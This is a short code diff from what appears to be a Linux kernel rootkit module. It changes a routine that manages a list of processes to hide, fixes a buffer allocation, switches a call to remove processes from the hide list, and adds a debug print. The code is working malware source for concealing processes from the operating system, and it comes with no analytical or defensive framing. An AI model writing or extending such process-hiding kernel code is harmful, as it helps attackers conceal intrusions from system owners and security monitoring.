@@ -151,18 +151,15 @@ int show(const char __user *path) {
     kfree(_path);
     return result;
   }
-  tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
+  tempPath = kcalloc(strlen(_path) + strlen(hide__prefix) + 1,1,GFP_KERNEL);
   if(IS_ERR_OR_NULL(tempPath)){
     kfree(_path);
     return -ENOMEM;
   }
-  result = strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
-  if (result) {
-    kfree(_path);
-    kfree(tempPath);
-  }
+  strcpy(tempPath, hide__prefix);
+  strcat(tempPath, _path);
   //      printk("%s",tempPath);
-  result = addProcessToHide(tempPath);
+  result = deleteProcessToHide(tempPath);
   kfree(_path);
   if(result == -ENOMEM) {
     kfree(tempPath);
@@ -194,6 +191,7 @@ static int addProcessToHide(char* processName){
         if(dynamic_processes_to_hide[i] == NULL){
             dynamic_processes_to_hide[i] = processName;
             arrayListSize++;
+printk("{%s}\n", processName);
             break;
         }
     }
